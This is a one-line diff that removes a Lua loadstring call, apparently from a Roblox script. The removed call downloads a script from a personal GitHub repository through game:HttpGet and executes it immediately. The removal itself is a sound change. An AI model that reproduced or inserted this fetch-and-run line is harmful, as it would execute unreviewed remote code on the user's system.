@@ -1,1 +1,0 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/xdeformedbread/My-Scripts/main/loadstring",true))()
